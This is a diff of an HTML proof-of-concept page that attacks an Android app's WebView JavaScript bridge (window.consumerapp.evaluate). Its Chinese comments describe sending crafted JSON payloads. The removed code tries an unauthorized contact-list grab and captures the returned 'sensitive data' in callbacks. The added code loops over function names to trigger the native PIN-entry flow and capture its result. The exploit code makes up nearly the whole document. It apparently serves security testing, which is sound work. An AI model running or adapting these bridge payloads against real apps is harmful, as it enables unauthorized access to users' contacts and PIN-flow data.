@@ -22,61 +22,33 @@
     <div id="log" style="background: #f5f5f5; padding: 10px; border-radius: 5px; min-height: 100px; white-space: pre-wrap;"></div>
 
     <script>
- // 检测并列出 Android Bridge 对象的所有可用方法
-// 验证 1：触发 PIN 码输入弹窗
-function testTriggerPin() {
-    try {
-        if (window.consumerapp && typeof window.consumerapp.evaluate === 'function') {
-            showLog("[*] 正在向 Android 发送精心构造的单 JSON 字符串...");
-            
-            // 严格按照底层源码的字段构造数据
+function testAndroidPin() {
+    if (window.consumerapp && typeof window.consumerapp.evaluate === 'function') {
+        showLog("[*] 正在尝试触发 Android PIN 码功能的精准 Payload...");
+        
+        // 尝试两端最通用的常量字符串值
+        const targetFunctions = ["kWebRequestPin", "requestPin"];
+        
+        targetFunctions.forEach(funcName => {
             const payload = {
-                "functionName": "kWebRequestPin",
-                "functionCallBackName": "myPinCallback", // 预留回调
+                "functionName": funcName,
+                "functionCallBackName": "myPinSuccessCallback", // 同级传递，供底层解析器提取
                 "params": {
-                    "reason": "验证安全风险，请确认PIN码"
+                    // 底层 RequestPin 显式要求 params 内必须能读到它，双重保险
+                    "functionCallBackName": "myPinSuccessCallback", 
+                    "reason": "PoC测试"
                 }
             };
             
-            // 关键点：必须使用 JSON.stringify 变成单个字符串传给 Java
             window.consumerapp.evaluate(JSON.stringify(payload));
-            showLog("[+] 已发送调用请求，请观察手机屏幕是否弹出 PIN 码输入框。");
-        } else {
-            showLog("[-] 未找到 window.consumerapp.evaluate 方法");
-        }
-    } catch (e) {
-        showLog("[-] 执行异常: " + e.message);
+        });
+        
+        showLog("[+] 请求已发送，若常量对齐，手机将进入 gotoEnterPin() 逻辑。");
     }
 }
 
-// 验证 2：获取通讯录并观察返回
-function testObtainContact() {
-    try {
-        if (window.consumerapp && typeof window.consumerapp.evaluate === 'function') {
-            showLog("[*] 正在尝试越权获取通讯录...");
-            
-            const payload = {
-                "functionName": "kWebObtainContact", // 或者根据你之前的分析尝试 kWebGetContactPhoneNumber
-                "functionCallBackName": "myContactCallback", // 指定接收数据的回调函数名
-                "params": {}
-            };
-            
-            window.consumerapp.evaluate(JSON.stringify(payload));
-            showLog("[+] 已发送获取通讯录请求，请在下方或全局观察数据返回。");
-        }
-    } catch (e) {
-        showLog("[-] 执行异常: " + e.message);
-    }
-}
-
-// 定义回调函数，用于捕获和观察原生 App 吐回来的敏感数据
-window.myPinCallback = function(result) {
-    showLog("[🔥 捕获到 PIN 回调数据]: " + JSON.stringify(result));
-};
-
-window.myContactCallback = function(result) {
-    showLog("[🔥 捕获到通讯录数据]: " + JSON.stringify(result));
-};
-    </script>
+window.myPinSuccessCallback = function(res) {
+    showLog("[🔥 成功捕获 PIN 码组件返回]: " + JSON.stringify(res));
+};    </script>
 </body>
 </html>
